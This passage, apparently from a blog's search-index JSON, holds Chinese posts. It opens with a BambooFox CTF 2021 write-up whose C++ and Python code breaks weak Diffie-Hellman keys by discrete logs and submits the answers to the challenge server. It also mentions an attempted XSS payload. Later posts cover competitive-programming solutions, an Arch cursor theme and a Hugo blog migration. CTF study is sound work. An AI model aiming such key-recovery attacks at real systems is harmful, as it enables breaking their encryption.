vector\u0026lt;long long\u0026gt; chk = {2,325,9375,28178,450775,9780504,1795265022}; bool Check(long long a, long long u, long long n, int t) { a = modpow(a, u, n); if (a == 0 || a == 1 || a == n - 1) return true; for (int i = 0; i \u0026lt; t; ++i) { a = modmul(a, a, n); if (a == 1) return false; if (a == n - 1) return true; } return false; } bool operator()(long long n) { if (n \u0026lt; 2) return false; if (n % 2 == 0) return n == 2; long long u = n - 1; int t = 0; for (; !(u \u0026amp; 1); u \u0026gt;\u0026gt;= 1, ++t); for (long long i : chk) { if (!Check(i, u, n, t)) return false; } return true; } } prime; map\u0026lt;long long, int\u0026gt; cnt; void pollardRho(long long n) { if (n == 1) return; if (prime(n)) return ++cnt[n], void(); if (n % 2 == 0) return pollardRho(n / 2), ++cnt[2], void(); long long x = 2, y = 2, d = 1, p = 1; auto f = [\u0026amp;](auto x, auto n, int p) { return (modmul(x, x, n) + p) % n; }; while (true) { if (d != n \u0026amp;\u0026amp; d != 1) { pollardRho(n / d); pollardRho(d); return; } if (d == n) ++p; x = f(x, n, p); y = f(f(y, n, p), n, p); d = __gcd(abs(x - y), n); } } ll mxPrime(ll n) { ll mx = 0; cnt.clear(); pollardRho(n); for(auto [a, b]: cnt) mx = max(mx, a); return mx; } } factor; struct CRT { ll R, M; CRT() : R(0), M(1) {} template \u0026lt;typename T\u0026gt; tuple\u0026lt;T, T, T\u0026gt; extgcd(T a, T b) { if (!b) return make_tuple(a, 1, 0); T d, x, y; tie(d, x, y) = extgcd(b, a % b); return make_tuple(d, y, x - (a / b) * y); } void add(ll r, ll m) { long long d, x, y; tie(d, x, y) = extgcd(M, m * 1ll); assert ((r - R) % d == 0); long long new_M = M / __gcd(M, 1ll * m) * m; R += modmul(modmul(x, (r - R) / d, new_M), M, new_M); M = new_M; ((R %= M) += M) %= M; } pair\u0026lt;ll,ll\u0026gt; operator()() const { return {R, M}; } }; ll BSGS(ll a, ll b, ll m, ll T) { // a^x = b (mod m), and T is the period ll n = sqrt(T) + 1; ll an = modpow(a, n, m); unordered_map\u0026lt;ll, ll\u0026gt; vals; for (ll q = 0, cur = b; q \u0026lt;= n; ++q) { vals[cur] = q; cur = ((LLL) cur * a) % m; } // std::cerr \u0026lt;\u0026lt; \u0026#34;q = \u0026#34; \u0026lt;\u0026lt; q \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; for (ll p = 1, cur = 1; p \u0026lt;= n; ++p) { cur = ((LLL) cur * an) % m; if (vals.count(cur)) { ll ans = n * p - vals[cur]; return ans; } } cerr \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#34; b = \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; \u0026#34; m = \u0026#34; \u0026lt;\u0026lt; m \u0026lt;\u0026lt; \u0026#34; T = \u0026#34; \u0026lt;\u0026lt; T \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; cerr \u0026lt;\u0026lt; \u0026#34;NOT FOUND\\n\u0026#34;; exit(1); } using __gnu_cxx::power; ll discreteLog(ll a, ll b, ll m) { // m is prime auto solve = [m](ll g, ll h, ll p, ll e) { ll x = 0; ll r = modpow(g, power(p, e-1), m); ll invg = modpow(g, m-2, m); for(int k = 0; k \u0026lt; e; k++) { ll hk = modpow(modmul(modpow(invg, x, m), h, m), power(p, e-1-k), m); ll d = BSGS(r, hk, m, p); x += power(p, k) * d; // cerr\u0026lt;\u0026lt;\u0026#34;k = \u0026#34;\u0026lt;\u0026lt;k\u0026lt;\u0026lt;\u0026#34; ; \u0026#34;; } // cerr \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return x; }; ll phi = m-1; CRT crt; for(auto [p, e]: factor.cnt) { ll P = power(p, e); ll X = solve(modpow(a, phi / P, m), modpow(b, phi / P, m), p, e); crt.add(X, P); } assert(crt().second == phi); assert(modpow(a, crt().first, m) == b); return crt().first; } struct Edge { int j; ll m, g, A, B; Edge(int j, ll m, ll g, ll A, ll B) : j(j), m(m), g(g), A(A), B(B) {} }; signed main() { std::cerr \u0026lt;\u0026lt; \u0026#34;solve.cpp::main() start.\\n\u0026#34;; ios_base::sync_with_stdio(0), cin.tie(0); const int n = 420; int a, b; vector\u0026lt;vector\u0026lt;Edge\u0026gt;\u0026gt; adj(n); while(cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b) { assert(1 \u0026lt;= a \u0026amp;\u0026amp; a \u0026lt;= n \u0026amp;\u0026amp; 1 \u0026lt;= b \u0026amp;\u0026amp; b \u0026lt;= n \u0026amp;\u0026amp; a != b); ll m, g, A, B; cin \u0026gt;\u0026gt; m \u0026gt;\u0026gt; g \u0026gt;\u0026gt; A \u0026gt;\u0026gt; B; --a, --b; adj[a].emplace_back(b, m, g, A, B); adj[b].emplace_back(a, m, g, B, A); } vector\u0026lt;ll\u0026gt; ans; vector\u0026lt;int\u0026gt; vis(n); function\u0026lt;void(int)\u0026gt; dfs = [\u0026amp;](int i) { vis[i] = true; for(auto [j, m, g, A, B]: adj[i]) { if(vis[j]) continue; if(factor.mxPrime(m-1) \u0026gt;= 1e15) { cerr \u0026lt;\u0026lt; m-1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; continue; } // cerr \u0026lt;\u0026lt; A \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; B \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; ll sa = discreteLog(g, A, m); ll sb = discreteLog(g, B, m); assert(modpow(g, sa, m) == A \u0026amp;\u0026amp; modpow(g, sb, m) == B); ans.emplace_back(modpow(A, sb, m)); // cerr \u0026lt;\u0026lt; ans.back() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; dfs(j); } }; dfs(0); std::cerr \u0026lt;\u0026lt; \u0026#34;ans.size() = \u0026#34; \u0026lt;\u0026lt; ans.size() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; assert(ans.size() == n-1); for(ll x: ans) cout \u0026lt;\u0026lt; x \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 #!/usr/bin/env python3 import os import sys import time import socket import hashlib import re import random host = \u0026#34;chall.ctf.bamboofox.tw\u0026#34; port = 10369 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) print(\u0026#39;connect success\u0026#39;) def pow_solver(prefix, difficulty): zeros = \u0026#39;0\u0026#39; * difficulty def is_valid(digest): if sys.version_info.major == 2: digest = [ord(i) for i in digest] bits = \u0026#39;\u0026#39;.join(bin(i)[2:].zfill(8) for i in digest) return bits[:difficulty] == zeros i = 0 while True: i += 1 s = prefix + str(i) if is_valid(hashlib.sha256(s.encode()).digest()): return i def main(): print(\u0026#39;main start\u0026#39;) question = s.recv(4096) question = question.decode(\u0026#39;ascii\u0026#39;) print(question) question = question[58:74] print(question) ans = pow_solver(question, 20) print(str(ans) + \u0026#39;\\n\u0026#39;) s.send(bytes(str(ans) + \u0026#39;\\n\u0026#39;, \u0026#39;ascii\u0026#39;)) _ = s.recv(4096) print(_.decode(\u0026#39;utf-8\u0026#39;)) s.send(bytes(\u0026#39;\\n\u0026#39;, \u0026#39;utf-8\u0026#39;)) with open(\u0026#39;edges.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: while True: _ = s.recv(4096) if len(_) == 0: break content = _.decode(\u0026#39;ascii\u0026#39;) # print(content) content = re.sub(\u0026#34;[^\\d\\s]\u0026#34;, \u0026#34;\u0026#34;, content) f.write(content) if _.decode(\u0026#39;ascii\u0026#39;).find(\u0026#34;Enter\u0026#34;) != -1: break; os.system(\u0026#34;./solve \u0026lt; edges.txt \u0026gt; ans.txt\u0026#34;) with open(\u0026#34;ans.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: ans = f.readlines(); print(ans, len(ans)) ans = \u0026#39; \u0026#39;.join([x.strip() for x in ans]) print(ans) s.send(bytes(str(ans) + \u0026#39;\\n\u0026#39;, \u0026#39;ascii\u0026#39;)) res = s.recv(1024) print(res.decode(\u0026#39;utf-8\u0026#39;)) # os.system(\u0026#34;./solve\u0026#34;) main() 1 2 g++ solve.cpp -o solve -std=c++17 python solve.py After that 接下來我又花了一個半夜去嘗試Web題\ntime to draw看起來就是要對那個api做怪事情，但我整個方向錯誤了，我誤以為是要XSS所以瘋狂送color={\u0026quot;match\u0026quot;: \u0026quot;function() { ... }\u0026quot;}的請求，但其實根本沒辦法執行這字串裡面的東西QQ\n我也有看表情符號那一題，但是實在對PHP太陌生了，我現在連官方解答都不知道為什麼會對，他不是會檢查長度嗎？？？\n總之，我覺得我們web跟pwn太弱了（或者說這次出的都是演算法題XD）\n不知道這種injection應該如何練習是好(X\n最後名次是12名，跟去年比起來進步不只一半\n而且意外的是我們是台灣前三名所以可以拿獎金耶，超爽der\n明年不意外應該也是會來玩ㄅ，不過如果問我途中會不會認真學大概就是不會吧owo\n打CTF真的很讓人享受解謎（？）的過程，不過也可能只是因為解的出來才享受吧。另外打CTF還有一個優點就是不會被ZCK電爛很開心(X\n","permalink":"https://omeletwithoutegg.github.io/2021/01/19/bamboofox-ctf-2021/","tags":["CTF","experience"],"title":"BambooFox CTF 2021"},{"contents":"變動的過路費 https://tioj.ck.tp.edu.tw/problems/1597\nDescription 給你一張有向圖，每個邊會有隨時間變動的權重，並且邊的權重對時間是一個線性函數。\n再給你兩個點 $A,B$，現在你想要從 $A$ 走到 $B$ 再走回 $A$，\n問你在時間 $[0, D-1]$ 中，最長的最短路徑和最短的最短路徑相差多少。\n保證在時間內的邊權都是非負整數，並且答案不會超過long long。\nSolution 這題很久以前就跟蕭梓宏討論過了，不過我怎麼寫都會吃WA 0分\n今天#define int ll結果就拿了67分XD仔細檢查才發現原來一條邊的邊權可以不在int的範圍內但我卻用了int\n忘記開long long真的Orz\n因為線性函數的和還是線性函數，考慮所有的「路徑」，他們都代表一條對時間的線性函數。\n而某個時間點的最短路徑就是這些直線的 $\\min$。也就是說，所有時間點的最短路徑是所有路徑的線性函數的下凸包(lower envelope)\n把這個凸包建出來似乎不是可行的（？）所以就考慮三分搜找出最大值。至於最小值一定是在端點，所以相減就是答案了。\n好像有卡一些常數QQ我還得判如果dijkstra跑到終點就return、三分搜遇到相同就break;之類的，不知道是不是TIOJ主機變慢了QQ\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 #pragma GCC optmize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\n\u0026#34;))); } #else #define safe ((void)0) #define debug(...) ((void)0) #endif // local #define pb emplace_back #define all(v) begin(v),end(v) using namespace std; template \u0026lt;typename T\u0026gt; using min_heap = priority_queue\u0026lt;T, vector\u0026lt;T\u0026gt;, greater\u0026lt;T\u0026gt;\u0026gt;; using ll = long long; using ld = double; struct Dijkstra { vector\u0026lt;vector\u0026lt;tuple\u0026lt;ll,ll,int\u0026gt;\u0026gt;\u0026gt; g; vector\u0026lt;ll\u0026gt; dis; vector\u0026lt;bool\u0026gt; vis; Dijkstra(size_t n) : g(n), dis(n), vis(n) {} void addEdge(int a, int b, ll c, ll p) { g[a].pb(c, p, b); } ll shortestPath(int s, int t, int T) { fill(all(dis), -1); fill(all(vis), false); min_heap\u0026lt;pair\u0026lt;ll,int\u0026gt;\u0026gt; pq; pq.push({0, s}); dis[s] = 0; while(!pq.empty()) { auto [d, i] = pq.top(); pq.pop(); if(vis[i]) continue; vis[i] = true; if(i == t) return d; for(auto [c, p, j]: g[i]) { if(vis[j]) continue; ll w = c + p * T; if(dis[j] == -1 || dis[j] \u0026gt; d + w) { dis[j] = d+w; pq.push({dis[j], j}); } } } // assert(dis[t] != -1); return dis[t]; } }; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m, A, B, D; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m \u0026gt;\u0026gt; A \u0026gt;\u0026gt; B \u0026gt;\u0026gt; D; Dijkstra dij(n); // -\u0026gt; : i * 2 // \u0026lt;- : i*2+1 for(int i = 0; i \u0026lt; m; i++) { int x, y; ll c1, p1, c2, p2; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y \u0026gt;\u0026gt; c1 \u0026gt;\u0026gt; p1 \u0026gt;\u0026gt; c2 \u0026gt;\u0026gt; p2; dij.addEdge(x, y, c1, p1); dij.addEdge(y, x, c2, p2); } auto calc = [\u0026amp;](int T) -\u0026gt; ll { return dij.shortestPath(A, B, T) + dij.shortestPath(B, A, T); }; ll ans = 0; for(int s = 1 \u0026lt;\u0026lt; 29; s; s\u0026gt;\u0026gt;=1) { debug(ans, s); if(ans + s \u0026gt;= D) continue; ll c1 = calc(ans + s - 1); ll c2 = calc(ans + s); if(c1 \u0026lt;= c2) ans += s; if(c1 == c2) break; } cout \u0026lt;\u0026lt; calc(ans) - min(calc(0), calc(D-1)) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } XD 突然發現最近發好幾題凸包的解\n我真的很喜歡凸包耶(X\n然後一年又過去了，時間真的好快\n前幾天去TPMSO還有dreamoon的課程，反而讓我的迷惘感更多了XD\n每個學長都超級厲害\n尤其是陳柏叡學長，他雖然外表超年輕但是超級成熟的感覺\n現在應該做的事，大概就是在寒假左右把專題弄一個段落，然後把選訓好好走完吧。\n也許今年還是有機會國手，但是我認真覺得不可能贏balbit跟ZCK，他們實在太強了\n而且我因為專題被催根本沒辦法好好練習QQ\n不過我的目標也不是贏過他們，希望至少有機會明年拿個更好的牌，為此我得先做完專題給自己一個好的練習環境（\n","permalink":"https://omeletwithoutegg.github.io/2020/12/30/TIOJ-1597/","tags":["TIOJ","dijkstra","ternary-search"],"title":"TIOJ 1597"},{"contents":"賽車問題 https://tioj.ck.tp.edu.tw/submissions/231136\nDescription 現在有 $n$ 輛往右邊跑的賽車，每一輛都有其固定的車速以及起始位置。\n你想要知道在從現在開始的所有時刻中，什麼時候最領先的車子跟最落後的車子的距離會最短。\n可以假設車速都不相同\nSolution 首先每個車的位置對於時間是一個一次函數，而「每個時刻最前面的車的位置」和「每個時刻最後面的車的位置」就是這些直線形成的上下凸包（envelope）\n這題可以用三分搜寫掉（？）\n不過可以把凸包真的建出來做。最佳的答案一定會出現在凸包的頂點上，或是邊界（也就是時刻=0的時候）\n於是建出來之後用雙指標依照x由小到大檢查上下凸包的距離就可以了，記得要處理邊界的case。\n這樣雖然時間複雜度還是有 $\\log$ ，不過是 sort 的 $\\log n$。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define debug(args...) qqbx(#args, args) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\n\u0026#34;))); } #else #define debug(...) ((void)0) #endif #define pb emplace_back #define all(v) begin(v),end(v) using namespace std; using ll = long long; using ld = double; using pii = pair\u0026lt;int,int\u0026gt;; const int N = 1025; const ll INF = 1e18; ll ori(pii a, pii b, pii c) { return 1LL * (a.second - b.second) * (c.first - a.first) - 1LL * (a.second - c.second) * (b.first - a.first); } ld calc(pii L, ld x) { return L.first * x + L.second; } ld intersect(pii a, pii b) { return (a.second - b.second) / ld(b.first - a.first); } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n; cin \u0026gt;\u0026gt; n; vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; car(n); for(auto \u0026amp;[v, s]: car) cin \u0026gt;\u0026gt; v \u0026gt;\u0026gt; s; sort(all(car)); vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; lo, up; for(auto [a, b]: car) { while(up.size() \u0026gt;= 2 \u0026amp;\u0026amp; ori(up[up.size()-2], up.back(), {a, b}) \u0026gt;= 0) up.pop_back(); up.pb(a, b); } reverse(all(car)); for(auto [a, b]: car) { while(lo.size() \u0026gt;= 2 \u0026amp;\u0026amp; ori(lo[lo.size()-2], lo.back(), {a, b}) \u0026gt;= 0) lo.pop_back(); lo.pb(a, b); } /* reverse(all(up)); */ /* cerr \u0026lt;\u0026lt; \u0026#34;lo =\\n\u0026#34;; */ /* for(auto [a, b]: lo) debug(a, b); */ /* cerr \u0026lt;\u0026lt; \u0026#34;up =\\n\u0026#34;; */ /* for(auto [a, b]: up) debug(a, b); */ int mx = -1e9, mn = 1e9; for(auto \u0026amp;[v, s]: car) mx = max(mx, s), mn = min(mn, s); ld ans = mx - mn; size_t i = 0, j = 0; debug(lo.size(), up.size()); while(i+1 \u0026lt; lo.size() || j+1 \u0026lt; up.size()) { ld xi = i+1 \u0026lt; lo.size() ? intersect(lo[i], lo[i+1]) : 1e18; ld xj = j+1 \u0026lt; up.size() ? intersect(up[j], up[j+1]) : 1e18; debug(xi, xj); debug(i, j); if(xi \u0026lt; xj) { if(xi \u0026gt;= 0) ans = min(ans, calc(up[j], xi) - calc(lo[i], xi)); i++; } else { if(xj \u0026gt;= 0) ans = min(ans, calc(up[j], xj) - calc(lo[i], xj)); j++; } } printf(\u0026#34;%.2lf\\n\u0026#34;, ans); } ","permalink":"https://omeletwithoutegg.github.io/2020/12/23/TIOJ-1284/","tags":["TIOJ","geometry","math","ternary-search"],"title":"TIOJ 1284"},{"contents":"在Arch的初音游標 因為在Windows有下載一個可愛的初音游標，但是之前換成Ubuntu後就沒有把他裝回來，覺得很可惜。\n因此現在換成Arch之後，想說應該有一些社群的package可以用了，直接抓來就好，但是怎麼google都google不到？\n因此大概花了半天去解決他，想說在這邊做個小筆記以免下次重裝的時候重摸一遍。\n找到巴哈姆特上面的原始檔（是.ani跟.cur） 利用cursor-converter把.ani和.cur換成x-cursor的icon類型 手動把對應的圖案複製到 ~/.icons/$THEME/cursors 裡面\n如果不知道哪個檔名是什麼的話，可以先複製別的theme的資料夾，接著用 xcur2png 換成 png看某個檔案實際上是對應哪個圖案。 加上 index.theme。反正只要有Name就可以了吧我猜 中間踩了各種怪東西XD\n我原本先去下載了其他主題，想說看別的主題的游標應該是什麼對應到什麼，尤其是有動畫的。\n不過似乎有動畫的游標和沒動畫的檔名一樣QQ\n然後有找到一個ani2png，但是畫質會爆炸而且沒有幫忙放到對應的位置（雖然最後也是我們自己放到對應的位置）\n接著找到CSDN上面有人說用CursorXP從Windows上面把游標主題包起來，接著在Linux下載一個用來轉換成icon類型的Perl腳本，\n會轉換成一個tar.gz然後就可以安裝的樣子了，不過還是偏糟，從Windows上面看就發現畫質還是大小大爆炸了\n最後終於走對路，找到github上面一個比較新的repo是把.ani跟.cur轉成linux的x-cursor檔案\n真是要感謝他們www\n話說我發現其實可以直接把檔案放到github上面，這樣也可以推廣或是找人來修改(X\n裡面有好多icon是從breeze主題抄過來的，畢竟應該都是很少看到的icon所以應該不會影響太大，但是想包成AUR或是什麼的時候好像就得在乎一點一致性ㄌ，所以希望放到github上之後有人可以把其他那些icon改成統一的風格owo\n","permalink":"https://omeletwithoutegg.github.io/2020/12/10/arch-miku-mouse/","tags":["arch","experience","miku"],"title":"Miku Cursor on Arch Linux"},{"contents":"Hugo! 似乎因為casper而嘗試從hexo跳槽到hugo。\nhexo似乎是對windows比較友善？檔名都一堆底線之類的\n啊hugo好像是對macOS比較友善QQ\nStartup Hugo沒有預設的theme，所以如果不想無中生有一定要裝一個theme。\n我原本用的Hexo Theme Cactus在Hugo也有人維護一個theme，不過feature就沒有那麼多了。\n總之試著寫一個markdown然後 hugo server\n驚訝的發現他超快XDD應該說是Hexo太慢了，我想node.js天生本來就有一些缺點吧。\n既然可以拋棄噁心的 node_modules 還有底線，而且還可以讓他 generate 的時間變超快，我決定試看看能不能把整個網站從Hexo改成用Hugo寫，並且同時大部份東西仍然保持跟之前相同，例如Repo、網址、code highlight、search/tag feature等等\n一些遇到的問題 Hard Line Break 這個蠻可怕的。在用Hexo的時候沒什麼感覺，但是我的Markdown全部都是用直接換行來換行；而Hugo預設不是，也就是說他應該要用兩個空格或是反斜線的方式來換行。這其實是Markdown預設的換行方式，但是真的很不習慣，不知道該怎麼說。而且也不可能一個一個檔案調整XD Solution:\n一開始查到可以在 config.html 裡面加 1 2 [blackfriday] extensions = [\u0026#34;hardLineBreak\u0026#34;] 不過都沒有效。後來才知道Blackfriday是Hugo原本拿來render markdown的東西，而某次更新之後已經換成Goldmark這個套件了。 基於我找不到怎麼在Goldmark加上 Hard Line Break 的選項，我選擇改回用Blackfriday render就好。 1 2 [markup] defaultMarkdownHandler = \u0026#34;blackfriday\u0026#34; 沒有search Solution:\nGoogle了一陣子。中間找到這個使用Fuse.js的一個實作，不知道為什麼是放在討論區：https://gist.github.com/eddiewebb/735feb48f50f0ddd65ae5606a1cb41ae\n雖然蠻快找到，不過我踩了很多雷。\n首先是他寫法是 define \u0026quot;footerfiles\u0026quot;，但是我的theme的基底模板沒有block \u0026quot;footerfiles\u0026quot;的區塊。所以我目前是把那段script跟他定義的main放在一起。\n再來是mark.js，一直出現 $(...).mark is not a function，我也不知道為什麼用 jquery 的 mark.js 就會出事，總之我最後是把 search.js 換成上面連結裡面有人提出來的不帶 jquery 的版本。CSS直接抄原本Hexo那邊的搜尋框XD 各種格式不一樣(日期、TOML v.s. YAML)\n這個其實還好，很快就能看懂TOML，畢竟他是設計給人看的。vim有插件可以幫TOML syntax highlight，如果是vim的使用者要記得學習使用工具wwww Code highlight and copy button\n我原本highlight的主題是 monokai-sublime，而Hugo是用Chroma這個套件幫程式碼區塊syntax highlight。研究了好久CSS之後終於調成跟原本差不多了www有夠難wwww\n另外原本我有一個Copy按鍵可以Copy整段Code，但是Hugo跟Hexo的程式碼區塊也被render得超不一樣，所以改那部份的JS、CSS跟調整Selector花了一些時間。 Background Animation\n我在之前就有用Canvas.js讓背景有奇怪的幾何線段，而在Hugo中要再做一遍這個太簡單了，就把code貼到可以include的地方就好。 mathjax escape\n以為自己快做完的時候發現出大事，好幾篇的LaTeX出事了。經過一些觀察我發現是 _ 前面沒有空格就可能會出事被解讀成粗體，還有在math裡面的 \\\\ 不知道為什麼沒用。\n因為幾乎查不到Hugo或Blackfriday Mathjax的選項或是解決方法，所以我的解法是妥協，在 _ 前後各加一個空格以示安全，而 \\\\則是換成\\newline；希望我之後寫文章會記得。由於這些修改都是針對很多文章，因此我是用grep跟sed批次解決的。 小撇步 在本機測試的時候，如果只是為了 hugo server 就得耗掉一個terminal的視窗有點浪費，可以用 hugo server \u0026gt;server.log \u0026amp;來讓他在背景執行，並且使用 fg 把他叫回前台以讓我們停止他。\n當然如果是用GUI文字編輯器就沒什麼差了XD\nTravis CI So hard\n不過這東西有點真香\n總之就是不用弄髒自己的電腦去安裝build、deploy需要的套件，而且可以讓你的整個專案管理變得很簡單。\n參考BB的寫法，想辦法把 .travis.yml 弄好之後，看起來他的deploy流程是這樣：\n有兩個分支，master存md、js、css、html模板等local會存的東西、gh-pages存龐大的靜態檔案。\n每次遇到master的commit，就嘗試把master build出來的東西塞到gh-pages這個分支，並讓gh-pages作為githug pages。\n然後我驚訝的發現這樣我的github repo就變得超乾淨XDD真香\n我大概 build 失敗了 10 次才穩定成功@@，中間都是在把從BB那邊抄過來的 .travis.yml 調整成新版本中官方建議的寫法，還有各種玩git：搬運repo或是fork、submodule等等，感覺好像稍微對git熟悉了一點。\nTravis CI可以有更客製化的Build跟Deploy選項，基本上得自己寫script。\n我還有看到BB他們會把Travis CI拿來編譯LaTeX，也就是說本機上為了編譯龐大的Codebook裝一大堆套件絕對不是最好的選擇。\nTODO: search result只有一個？ (Bug, fixed) syntax highlight style (OK) Copy code button (OK) Background Animation (OK) Travis CI deploy (Finally done) 測試 This is nobody speaking.\nBOLD, italic, ITALIC BOLD\nThis is $\\LARGE{\\text{inline math text}}$.\n$$\n\\text{Display Math with } \\LaTeX. ,\nI_n =\n\\left[\\begin{matrix}\n1 \u0026amp; \u0026amp; \\dots \u0026amp; \u0026amp; 0 \\newline\n\u0026amp; \\ddots \u0026amp; \u0026amp; \u0026amp; \\newline\n\\vdots \u0026amp; \u0026amp; 1 \u0026amp; \u0026amp; \\vdots \\newline\n\u0026amp; \u0026amp; \u0026amp; \\ddots \u0026amp; \\newline\n0 \u0026amp; \u0026amp; \\dots \u0026amp; \u0026amp; 1 \\newline\n\\end{matrix}\\right]\n$$\n1 2 arr = [int(t) for t in input().split()] print([x**2 for x in arr]) 1 2 3 4 5 6 7 8 9 #include \u0026lt;bits/stdc++.h\u0026gt; #define safe std::cerr \u0026lt;\u0026lt; __PRETTY_FUNCTION__ \u0026lt;\u0026lt; \u0026#34; line \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; safe\\n\u0026#34; using namespace std; signed main() { safe; int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; cout \u0026lt;\u0026lt; a + b \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2020/11/25/hugo-framework/","tags":["Hugo","blog"],"title":"Hugo Framework"},{"contents":"邀請函（Invitation） https://tioj.ck.tp.edu.tw/problems/1978\nDescription 給你一張圖，求出最大點獨立集。\n點數最多80\nSolution 我本來一直以為這題是一般圖最大匹配，不過今天仔細看之後發現不是，而且一般圖沒有最大匹配=最小點覆蓋的結論。\n不過有最大點獨立集$+$最小點覆蓋$=|V|$。\n吳邦一教授講過關於最小點覆蓋的一個回溯法，於是我想說把他拿來用。\n其實這個演算法也很簡單，就每次挑最大degree的點出來要選或者不選就好，這樣的話複雜度聽起來會是$\\mathcal{O}(2^n)$之類的。\n不過我們可以先做以下幾個處理(簡化)\ndegree 0的點直接拔掉。 degree 1的點，選他不如選他唯一的鄰居 剩下假設最大的degree是2，那所有點的degree都是2了，也就是說是一堆環，可以判掉 於是乎我們只剩下最大degree至少是3的case了。\n如果不選那個點的話，那他的鄰居都必須要選，可以列出遞迴式$T(n) = T(n-1) + T(n-4) + f(n)$，$n$代表還沒決定要不要選的點的數量，$f(n)$代表維護上面那些東西需要的時間。\n解這個遞迴式可以直接DP，或是利用特徵方程式$\\lambda^n = \\lambda^{n-1} + \\lambda^{n-4} \\Rightarrow \\lambda^4 - \\lambda^3 - 1 = 0$，他最大的實根大約是1.38左右，所以我們dfs的複雜度最多是$\\mathcal{O}(1.38^n f(n))$。用蠻naive的寫法$f(n)$會是$\\mathcal{O}(n)$(我也不知道怎麼快速維護XD)，$n=80$代進去$80 \\cdot 1.38^{80}$似乎幾乎是不行，不過不知道為什麼會AC而且竟然只輸BB跟塗大為的submission XD\n寫完之後，身為admin看到幾乎所有人都是用random，心情很複雜(#\n還有BB跟waynetuinfor的演算法似乎是轉成clique在做，不知道大學打ICPC有沒有機會搞懂。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #ifdef local #include \u0026lt;bits/extc++.h\u0026gt; #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) using ost = std::ostream; #define DESTL(STL, BEG, END, OUT) \\ template \u0026lt;typename ...T\u0026gt; ost\u0026amp; operator\u0026lt;\u0026lt;(ost \u0026amp;O, std::STL\u0026lt;T...\u0026gt; v) { int f=0; for(auto x: v) O \u0026lt;\u0026lt; 